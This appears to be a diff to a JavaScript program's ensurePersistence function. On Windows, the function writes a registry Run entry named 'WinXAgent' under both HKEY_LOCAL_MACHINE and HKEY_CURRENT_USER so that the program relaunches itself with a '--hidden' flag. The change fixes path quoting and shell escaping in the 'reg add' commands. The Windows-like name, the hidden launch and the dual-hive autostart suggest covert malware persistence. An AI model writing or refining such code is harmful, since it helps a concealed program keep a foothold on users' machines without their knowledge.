@@ -136,9 +136,9 @@ async function ensurePersistence(targetPath) {
   if (process.platform !== 'win32') return;
   
   const isCompiled = Boolean(process.pkg);
-  const escapedPath = targetPath.includes(' ') ? `\\"${targetPath}\\"` : targetPath;
-  const cmdPath = isCompiled ? `${escapedPath} --hidden` : `node ${escapedPath} --hidden`;
-  const shellEscaped = cmdPath.replace(/"/g, '\\"');
+  // Wrap path in quotes and escape them for shell command arguments (/d and /tr)
+  const cmd = isCompiled ? `"${targetPath}" --hidden` : `node "${targetPath}" --hidden`;
+  const shellEscaped = cmd.replace(/"/g, '\\"');
 
   const regCmd = `reg add "HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v "WinXAgent" /t REG_SZ /d "${shellEscaped}" /f`;
   const hkcuCmd = `reg add "HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v "WinXAgent" /t REG_SZ /d "${shellEscaped}" /f`;
